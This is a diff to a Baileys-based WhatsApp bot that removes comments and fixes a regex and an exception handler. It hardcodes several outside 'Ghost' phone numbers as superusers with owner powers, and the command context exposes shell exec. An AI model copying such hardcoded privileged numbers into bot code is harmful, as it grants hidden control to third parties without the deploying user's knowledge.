@@ -1,6 +1,5 @@
-
 const {
-   default: KeithConnect, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent,
+  default: KeithConnect, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent,
   generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, useMultiFileAuthState,
   DisconnectReason, makeInMemoryStore, downloadContentFromMessage, jidDecode
 } = require("@whiskeysockets/baileys");
@@ -86,13 +85,11 @@ async function startKeith() {
   let lastTextTime = 0;
   const messageDelay = 5000;
 
-  // Handle incoming calls if anticall is enabled
   client.ev.on('call', async (callData) => {
     if (anticall === 'true') {
       const callId = callData[0].id;
       const callerId = callData[0].from;
 
-      // Reject the call
       await client.rejectCall(callId, callerId);
 
       const currentTime = Date.now();
@@ -141,7 +138,6 @@ async function startKeith() {
 
       const m = smsg(client, mek, store);
 
-      // Command Handler Logic
       const body = m.mtype === "conversation" ? m.message.conversation :
         m.mtype === "imageMessage" ? m.message.imageMessage.caption :
           m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : "";
@@ -155,7 +151,7 @@ async function startKeith() {
       const Ghost2 = "254110190196";
       const Ghost3 = "2547483876159";
       const Ghost4 = "254743995989";
-      const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, Ghost, Ghost2, Ghost3, Ghost4, dev].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
       const isOwner = superUserNumbers.includes(m.sender); 
       const isBotMessage = m.sender === botNumber;  
       const itsMe = m.sender === botNumber;
@@ -198,17 +194,15 @@ async function startKeith() {
       const isAdmin = m.isGroup ? groupAdmin.includes(m.sender) : false;
 
       const IsGroup = m.chat?.endsWith("@g.us");
-       
+
       const context = {
-        client, m, text, isBotMessage, Owner, chatUpdate, store, isBotAdmin, isOwner, isAdmin, IsGroup,
+        client, m, text, isBotMessage, chatUpdate, store, isBotAdmin, isOwner, isAdmin, IsGroup,
         participants, pushname, body, budy, totalCommands, args, mime, qmsg, msgKeith, botNumber, itsMe, packname,
         author, generateProfilePicture, groupMetadata, Keithspeed, mycode, fetchJson, exec, antibad, getRandom, UploadFileUgu,
         TelegraPh, prefix, cmd, botname, mode, antitag, antilink, antidelete, antionce, fetchBuffer,
         store, uploadtoimgur, chatUpdate, ytmp3, getGroupAdmins, Tag
       };
 
-
-      // Antilink Logic
       const forbiddenLinkPattern = /https?:\/\/[^\s]+/;
       if (body && forbiddenLinkPattern.test(body) && m.isGroup && antilink === 'true' && !isOwner && isBotAdmin && !isAdmin) {
         if (itsMe) return;
@@ -238,7 +232,6 @@ async function startKeith() {
         }
       }
 
-      // Antibad Word Logic
       const forbiddenWords = [
         'kuma',
         'mafi',
@@ -298,7 +291,7 @@ async function startKeith() {
     console.error("Unhandled Rejection at:", promise, "reason:", reason);
   });
 
-  process.on("Something went wrong", (err) => {
+  process.on("uncaughtException", (err) => {
     console.error("Caught exception:", err);
   });
 
